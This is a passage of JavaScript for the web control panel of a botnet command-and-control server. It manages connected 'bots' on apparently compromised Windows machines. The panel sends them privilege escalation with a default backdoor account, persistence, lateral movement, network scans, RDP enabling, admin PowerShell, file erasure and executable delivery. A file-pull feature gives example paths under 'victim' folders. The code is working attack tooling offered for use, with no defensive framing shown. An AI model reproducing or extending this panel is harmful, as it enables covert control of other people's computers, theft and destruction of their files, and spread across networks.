// C2 Control Panel - FINAL WITH FILE TRANSFER
let socket = null;
let selectedBots = [];
let currentShellBot = null;
let events = [];
let socketConnected = false;
let serverRunning = false;
let commandButtonsCreated = false;

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    console.log("DOM Loaded - Initializing C2 Control Panel");
    initializeSocket();
    setupCommandButtons();
    loadInitialData();
    updateButtonStates();
});

// Initialize Socket.IO connection
function initializeSocket() {
    console.log("Initializing Socket.IO connection...");
    socket = io();
    
    socket.on('connect', function() {
        console.log("Socket.IO connected");
        socketConnected = true;
        updateSocketStatus(true);
        showNotification('Connected to server', 'success');
        loadStatus();
    });
    
    socket.on('disconnect', function() {
        console.log("Socket.IO disconnected");
        socketConnected = false;
        updateSocketStatus(false);
        showNotification('Disconnected from server', 'error');
    });
    
    socket.on('server_update', function(data) {
        console.log("Server update received:", data);
        updateServerStatus(data);
    });
    
    socket.on('bot_connected', function(bot) {
        console.log("Bot connected:", bot);
        addBot(bot);
        showNotification(`Bot connected: ${bot.info.hostname}`, 'success');
    });
    
    socket.on('bot_disconnected', function(data) {
        console.log("Bot disconnected:", data);
        removeBot(data.bot_id);
        showNotification('Bot disconnected', 'warning');
    });
    
    socket.on('bot_output', function(data) {
        console.log("Bot output:", data);
        displayOutput(data);
    });
    
    socket.on('new_event', function(event) {
        console.log("New event:", event);
        addEvent(event);
    });
    
    socket.on('rdp_ready', function(data) {
        console.log("RDP ready:", data);
        handleRDPReady(data);
    });
    
    socket.on('shell_mode_changed', function(data) {
        console.log("Shell mode changed:", data);
        updateShellMode(data);
    });
    
    // New event for file uploads
    socket.on('file_uploaded', function(data) {
        console.log("File uploaded:", data);
        showNotification(`File uploaded from bot: ${data.filename}`, 'success');
    });
}

// Load initial data
function loadInitialData() {
    console.log("Loading initial data...");
    
    fetch('/api/status')
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log("Status data:", data);
            updateStatusDisplay(data);
        })
        .catch(error => {
            console.error('Error loading status:', error);
            showNotification('Error loading status: ' + error, 'error');
        });
    
    fetch('/api/bots')
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then(bots => {
            console.log("Bots data:", bots);
            bots.forEach(bot => addBot(bot));
            updateSelectedCount();
        })
        .catch(error => {
            console.error('Error loading bots:', error);
        });
    
    fetch('/api/events')
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then(events => {
            console.log("Events data:", events);
            events.forEach(event => addEvent(event));
        })
        .catch(error => {
            console.error('Error loading events:', error);
        });
}

// Setup command buttons
function setupCommandButtons() {
    if (commandButtonsCreated) return;
    
    console.log("Setting up command buttons...");
    
    const commands = [
        { name: 'System Info', cmd: 'sysinfo', icon: 'fas fa-info-circle', type: 'sysinfo' },
        { name: 'Enable RDP', cmd: 'enablerdp', icon: 'fas fa-desktop', type: 'enablerdp' },
        { name: 'Pri Escalation', cmd: 'privesc', icon: 'fas fa-user-shield', type: 'custom' },
        { name: 'Start Shell', cmd: 'shell', icon: 'fas fa-terminal', type: 'shell' },
        { name: 'PowerShell', cmd: 'powershell', icon: 'fas fa-terminal', type: 'custom' },
        { name: 'Launch', cmd: 'launch', icon: 'fas fa-rocket', type: 'custom' },
        { name: 'Upload File', cmd: 'store', icon: 'fas fa-upload', type: 'custom' },
        { name: 'Send File to Bot', cmd: 'retrieve', icon: 'fas fa-download', type: 'custom' },
        { name: 'Erase File', cmd: 'erase', icon: 'fas fa-trash-alt', type: 'custom' },
        { name: 'Persistence', cmd: 'persist', icon: 'fas fa-infinity', type: 'custom' },
        { name: 'Kill Process', cmd: 'kill', icon: 'fas fa-skull', type: 'custom' },
        { name: 'Network Scan', cmd: 'networkscan', icon: 'fas fa-network-wired', type: 'custom' },
        { name: 'Lateral Movement', cmd: 'lateral', icon: 'fas fa-network-wired', type: 'custom' },
        { name: 'Exit Bot', cmd: 'exit', icon: 'fas fa-sign-out-alt', type: 'custom' }
    ];
    
    const container = document.getElementById('command-buttons');
    if (!container) {
        console.error('Command buttons container not found!');
        return;
    }
    
    container.innerHTML = '';
    
    commands.forEach(cmd => {
        const button = document.createElement('button');
        button.className = 'command-btn';
        button.innerHTML = `<i class="${cmd.icon}"></i> ${cmd.name}`;
        button.addEventListener('click', () => {
            console.log(`Command button clicked: ${cmd.name} - ${cmd.cmd}`);
            
            if (cmd.name === 'Launch App/File') {
                showLaunchPopup();
            } else if (cmd.name === 'Launch') {    // <-- add this line
                showLaunchPopup();
            } else if (cmd.name === 'Kill Process') {
                showKillPopup();
            } else if (cmd.name === 'Upload File') {
                showUploadPopup();
            } else if (cmd.name === 'Erase File') {
                showErasePopup();
            } else if (cmd.name === 'Send File to Bot') {
                showRetrievePopup();
            } else if (cmd.name === 'privesc') {
                showPrivEscPopup();
            } else if (cmd.name === 'Lateral Movement') {
                showLateralMovementPopup();
            } else if (cmd.name === 'PowerShell') {
                showPowerShellPopup();
            } else {
                sendCommandToSelected(cmd.cmd, cmd.type);
            }
        });
        container.appendChild(button);
    });
    
    commandButtonsCreated = true;
    console.log("Command buttons setup complete");
}

// Popup Functions

function showLaunchPopup() {
    console.log("Showing launch popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'launch-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 400px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#58a6ff;margin-bottom:20px;text-align:center;">Launch Application/File</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Application or File Path:</label>
            <input type="text" id="app-name-input" placeholder="notepad.exe, calc.exe, C:\\file.txt" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;color:#8b949e;">
                <strong>Examples:</strong><br>
                notepad.exe<br>
                calc.exe<br>
                C:\\Users\\Public\\document.txt
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="launch-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="launch-execute" style="flex:1;padding:10px;background:#238636;border:1px solid #2ea043;border-radius:4px;color:white;cursor:pointer;">Launch</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('launch-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('launch-execute').onclick = () => {
        const appName = document.getElementById('app-name-input').value.trim();
        if (!appName) {
            alert('Please enter an application or file name');
            return;
        }
        document.body.removeChild(modalBackdrop);
        sendCommandToSelected(`launch ${appName}`, 'custom');
        showNotification(`Launch command sent: ${appName}`, 'info');
    };

    document.getElementById('app-name-input').focus();
}

function showKillPopup() {
    console.log("Showing kill popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'kill-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 400px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#ff6b6b;margin-bottom:20px;text-align:center;">Kill Process</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Process ID (PID):</label>
            <input type="text" id="pid-input" placeholder="e.g., 1234" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;color:#8b949e;">
                <strong>Examples:</strong><br>
                1234 - Kill process with PID 1234<br>
                5678 - Kill process with PID 5678
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="kill-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="kill-execute" style="flex:1;padding:10px;background:#da3633;border:1px solid #f85149;border-radius:4px;color:white;cursor:pointer;">Kill</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('kill-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('kill-execute').onclick = () => {
        const pid = document.getElementById('pid-input').value.trim();
        if (!pid) {
            alert('Please enter a Process ID');
            return;
        }
        if (!/^\d+$/.test(pid)) {
            alert('PID must be a numeric value');
            return;
        }
        document.body.removeChild(modalBackdrop);
        sendCommandToSelected(`kill ${pid}`, 'custom');
        showNotification(`Kill command sent for PID: ${pid}`, 'warning');
    };

    document.getElementById('pid-input').focus();
}

function showPrivEscPopup() {
    console.log("Showing privilege escalation popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'privesc-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 400px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#ff6b6b;margin-bottom:20px;text-align:center;">Privilege Escalation</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Username (Optional):</label>
            <input type="text" id="privesc-username" placeholder="SystemHelper" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Password (Optional):</label>
            <input type="password" id="privesc-password" placeholder="P@ssw0rd123!" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;color:#8b949e;">
                <strong>Requirements:</strong> Bot must be running as Administrator.<br>
                Default: SystemHelper / P@ssw0rd123!
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="privesc-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="privesc-execute" style="flex:1;padding:10px;background:#da3633;border:1px solid #f85149;border-radius:4px;color:white;cursor:pointer;">Execute</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('privesc-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('privesc-execute').onclick = () => {
        const username = document.getElementById('privesc-username').value.trim();
        const password = document.getElementById('privesc-password').value.trim();
        let cmd = 'privesc';
        if (username || password) {
            cmd += ' ' + (username || 'SystemHelper');
            if (password) cmd += ' ' + password;
        }
        document.body.removeChild(modalBackdrop);
        sendCommandToSelected(cmd, 'custom');
        showNotification('Privilege escalation command sent', 'warning');
    };

    document.getElementById('privesc-username').focus();
}

function showPowerShellPopup() {
    console.log("Showing PowerShell popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'powershell-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 500px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#58a6ff;margin-bottom:20px;text-align:center;">PowerShell (Run as Admin)</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">PowerShell Command:</label>
            <input type="text" id="ps-command-input" placeholder="Get-Process" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;color:#8b949e;">
                <strong>Examples:</strong><br>
                Get-ComputerInfo<br><br>
                Get-Process | Select Name, Id<br><br>
                Get-NetIPConfiguration<br><br>
                [bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)<br>
                to check if the powershell is running as admin or not
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="ps-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="ps-execute" style="flex:1;padding:10px;background:#1f6feb;border:1px solid #388bfd;border-radius:4px;color:white;cursor:pointer;">Execute</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('ps-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('ps-execute').onclick = () => {
        const command = document.getElementById('ps-command-input').value.trim();
        if (!command) {
            alert('Please enter a PowerShell command');
            return;
        }
        document.body.removeChild(modalBackdrop);
        sendCommandToSelected(`powershell ${command}`, 'custom');
        showNotification('PowerShell command sent', 'info');
    };

    document.getElementById('ps-command-input').focus();
}


// File Transfer Popups

function showUploadPopup() {
    console.log("Showing upload popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'upload-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 450px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#58a6ff;margin-bottom:20px;text-align:center;">Upload File from Bot</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Path on Bot:</label>
            <input type="text" id="upload-path" placeholder="C:\\Users\\Public\\file.txt" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;color:#8b949e;">
                <strong>Example:</strong><br>
                C:\\Users\\victim\\document.docx<br>
                D:\\data\\secret.jpg
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="upload-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="upload-execute" style="flex:1;padding:10px;background:#238636;border:1px solid #2ea043;border-radius:4px;color:white;cursor:pointer;">Upload</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('upload-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('upload-execute').onclick = () => {
        const path = document.getElementById('upload-path').value.trim();
        if (!path) {
            alert('Please enter a file path');
            return;
        }
        document.body.removeChild(modalBackdrop);
        
        // Send as structured store command
        fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target: 'selected',
                type: 'store',
                params: { filename: path }
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification(`Upload command sent for ${path}`, 'info');
            } else {
                showNotification('Error: ' + (data.error || 'Unknown error'), 'error');
            }
        })
        .catch(error => {
            console.error('Error sending upload command:', error);
            showNotification('Error: ' + error.message, 'error');
        });
    };

    document.getElementById('upload-path').focus();
}

function showErasePopup() {
    console.log("Showing erase popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'erase-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 450px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#ff6b6b;margin-bottom:20px;text-align:center;">Erase File</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Full path to file:</label>
            <input type="text" id="erase-path" placeholder="C:\\Users\\Public\\file.txt" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;color:#8b949e;">
                <strong>Example:</strong><br>
                C:\\Users\\victim\\document.docx<br>
                D:\\data\\secret.jpg
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="erase-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="erase-execute" style="flex:1;padding:10px;background:#da3633;border:1px solid #f85149;border-radius:4px;color:white;cursor:pointer;">Delete</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('erase-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('erase-execute').onclick = () => {
        const path = document.getElementById('erase-path').value.trim();
        if (!path) {
            alert('Please enter a file path');
            return;
        }
        document.body.removeChild(modalBackdrop);
        sendCommandToSelected(`erase ${path}`, 'custom');
        showNotification(`Erase command sent for: ${path}`, 'warning');
    };

    document.getElementById('erase-path').focus();
}

function showRetrievePopup() {
    console.log("Showing retrieve popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'retrieve-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 450px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#58a6ff;margin-bottom:20px;text-align:center;">Send File to Bot</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Server filename (in 'files/' folder):</label>
            <input type="text" id="retrieve-src" placeholder="example.exe" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Destination folder on bot (optional):</label>
            <input type="text" id="retrieve-dest" placeholder="C:\\Users\\Public\\Downloads" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;margin-top:10px;color:#8b949e;">
                <strong>Note:</strong> If you specify a folder, the file will be saved there with the same name. Leave blank to save in the bot's current directory.
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="retrieve-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="retrieve-execute" style="flex:1;padding:10px;background:#238636;border:1px solid #2ea043;border-radius:4px;color:white;cursor:pointer;">Send File</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('retrieve-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('retrieve-execute').onclick = () => {
        const src = document.getElementById('retrieve-src').value.trim();
        let dest = document.getElementById('retrieve-dest').value.trim();
        if (!src) {
            alert('Please enter a server filename');
            return;
        }
        
        // Build the full destination path
        let fullDest = src;  // default: just filename (current directory)
        if (dest) {
            // Ensure the folder path ends with a separator
            if (!dest.endsWith('\\') && !dest.endsWith('/')) {
                dest += '\\';
            }
            fullDest = dest + src;
        }
        
        document.body.removeChild(modalBackdrop);
        
        // Send as structured retrieve command
        fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target: 'selected',
                type: 'retrieve',
                params: {
                    filename: src,
                    dest: fullDest
                }
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification(`Retrieve command sent for ${src}`, 'info');
            } else {
                showNotification('Error: ' + (data.error || 'Unknown error'), 'error');
            }
        })
        .catch(error => {
            console.error('Error sending retrieve command:', error);
            showNotification('Error: ' + error.message, 'error');
        });
    };

    document.getElementById('retrieve-src').focus();
}

// Update button states
function updateButtonStates() {
    const startBtn = document.querySelector('.btn-success[onclick="startServer()"]');
    const stopBtn = document.querySelector('.btn-danger[onclick="stopServer()"]');
    
    console.log(`Updating button states - Server running: ${serverRunning}`);
    
    if (startBtn) {
        startBtn.disabled = serverRunning;
    }
    
    if (stopBtn) {
        stopBtn.disabled = !serverRunning;
        if (!stopBtn.disabled) {
            stopBtn.style.cursor = 'pointer';
            stopBtn.style.opacity = '1';
        }
    }
}

// Bot Management
function addBot(bot) {
    console.log("Adding bot:", bot);
    const container = document.getElementById('bot-list');
    if (!container) {
        console.error("Bot list container not found!");
        return;
    }
    
    const existingBot = document.querySelector(`.bot-item[data-bot-id="${bot.id}"]`);
    if (existingBot) {
        console.log("Bot already exists, updating...");
        updateBot(bot);
        return;
    }
    
    const botElement = document.createElement('div');
    botElement.className = 'bot-item';
    botElement.setAttribute('data-bot-id', bot.id);
    botElement.innerHTML = `
        <div class="bot-header">
            <div class="bot-name">
                <i class="fas fa-robot"></i>
                ${bot.info.hostname || bot.ip}
            </div>
            <div class="bot-status">${bot.status || 'connected'}</div>
        </div>
        <div class="bot-details">
            <div class="bot-detail">
                <i class="fas fa-user"></i>
                <span>${bot.info.username || 'Unknown'}</span>
            </div>
            <div class="bot-detail">
                <i class="fas fa-desktop"></i>
                <span>${bot.info.os || 'Windows'}</span>
            </div>
            <div class="bot-detail">
                <i class="fas fa-shield-alt"></i>
                <span>${bot.info.admin || 'No'}</span>
            </div>
            <div class="bot-detail">
                <i class="fas fa-network-wired"></i>
                <span>${bot.ip}</span>
            </div>
        </div>
    `;
    
    botElement.addEventListener('click', function(e) {
        console.log("Bot clicked:", bot.id);
        if (!e.target.closest('.bot-controls')) {
            toggleBotSelection(bot.id);
        }
    });
    
    container.appendChild(botElement);
    updateBotCount();
    
    const welcomeMsg = container.querySelector('.welcome-message');
    if (welcomeMsg) {
        welcomeMsg.remove();
    }
    
    if (bot.selected === true) {
        botElement.classList.add('selected');
        if (!selectedBots.includes(bot.id)) {
            selectedBots.push(bot.id);
        }
    }
    
    console.log("Bot added successfully");
}

function removeBot(botId) {
    console.log("Removing bot:", botId);
    const botElement = document.querySelector(`.bot-item[data-bot-id="${botId}"]`);
    if (botElement) {
        botElement.remove();
    }
    
    selectedBots = selectedBots.filter(id => id !== botId);
    
    updateBotCount();
    updateSelectedCount();
    
    console.log("Bot removed");
}

function toggleBotSelection(botId) {
    console.log("Toggling bot selection:", botId);
    const action = selectedBots.includes(botId) ? 'deselect' : 'select';
    
    fetch('/api/select', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            action: action,
            bots: [botId]
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const botElement = document.querySelector(`.bot-item[data-bot-id="${botId}"]`);
            if (botElement) {
                botElement.classList.toggle('selected');
            }
            
            if (action === 'select') {
                selectedBots.push(botId);
            } else {
                selectedBots = selectedBots.filter(id => id !== botId);
            }
            
            updateSelectedCount();
        }
    })
    .catch(error => {
        console.error("Error toggling bot selection:", error);
        showNotification('Error selecting bot: ' + error, 'error');
    });
}

function selectAll() {
    console.log("Selecting all bots");
    fetch('/api/select', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            action: 'select_all'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            selectedBots = data.selected || [];
            document.querySelectorAll('.bot-item').forEach(item => {
                item.classList.add('selected');
            });
            updateSelectedCount();
            showNotification('All bots selected', 'success');
        }
    })
    .catch(error => {
        console.error("Error selecting all bots:", error);
        showNotification('Error selecting all bots: ' + error, 'error');
    });
}

function clearSelection() {
    console.log("Clearing bot selection");
    fetch('/api/select', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            action: 'clear'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            selectedBots = [];
            document.querySelectorAll('.bot-item').forEach(item => {
                item.classList.remove('selected');
            });
            updateSelectedCount();
            showNotification('Selection cleared', 'success');
        }
    })
    .catch(error => {
        console.error("Error clearing selection:", error);
        showNotification('Error clearing selection: ' + error, 'error');
    });
}

// Server Start/Stop
function startServer() {
    console.log("Start server clicked");
    showServerConfigPopup();
}

function showServerConfigPopup() {
    console.log("Showing server config popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'server-config-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 400px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#58a6ff;margin-bottom:20px;text-align:center;">Start C2 Server</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Server IP:</label>
            <input type="text" id="server-ip-input" value="0.0.0.0" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Server Port:</label>
            <input type="number" id="server-port-input" value="8080" min="1" max="65535" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="display:flex;gap:10px;">
            <button id="server-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="server-start" style="flex:1;padding:10px;background:#238636;border:1px solid #2ea043;border-radius:4px;color:white;cursor:pointer;">Start Server</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('server-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('server-start').onclick = () => {
        const host = document.getElementById('server-ip-input').value.trim();
        const port = parseInt(document.getElementById('server-port-input').value);
        if (!host) {
            alert('Please enter a valid IP');
            return;
        }
        if (!port || port < 1 || port > 65535) {
            alert('Please enter a valid port (1-65535)');
            return;
        }
        document.body.removeChild(modalBackdrop);
        startServerWithSettings(host, port);
    };

    document.getElementById('server-ip-input').focus();
}

function startServerWithSettings(host, port) {
    console.log(`Starting server with settings: ${host}:${port}`);
    
    fetch('/api/start', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            host: host,
            port: port
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        console.log("Start server response:", data);
        if (data.success) {
            showNotification(`C2 Server started on ${host}:${port}`, 'success');
            
            const serverStatus = document.getElementById('server-status');
            const serverText = document.getElementById('server-text');
            
            if (serverStatus) {
                serverStatus.className = 'status-dot online';
            }
            
            if (serverText) {
                serverText.textContent = `C2 Server: Running (${host}:${port})`;
            }
            
            serverRunning = true;
            updateButtonStates();
            
            const outputArea = document.getElementById('output-area');
            if (outputArea) {
                outputArea.innerHTML = `
                    <div class="welcome-message">
                        <h3><i class="fas fa-satellite-dish"></i> C2 Server Active</h3>
                        <p><strong>Server IP:</strong> ${host}</p>
                        <p><strong>Server Port:</strong> ${port}</p>
                        <p><strong>Bot Connection Command:</strong></p>
                        <p><code>bot.exe ${host} ${port}</code></p>
                        <p>Waiting for bot connections...</p>
                    </div>
